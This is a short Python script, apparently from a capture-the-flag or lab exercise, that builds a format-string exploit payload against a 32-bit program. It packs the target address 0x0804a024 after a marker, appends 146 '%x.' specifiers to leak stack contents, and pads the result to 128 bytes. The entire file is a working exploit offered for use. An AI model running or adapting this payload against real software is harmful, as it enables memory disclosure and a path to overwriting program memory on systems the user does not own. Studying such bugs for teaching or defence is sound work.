import struct
exploit = "AAAA"
exploit += struct.pack("I", 0x0804a024)
exploit += "BB"
exploit += "%x."*146
exploit += "%x."
padding = "X"*(128-len(exploit))
print (exploit+padding)
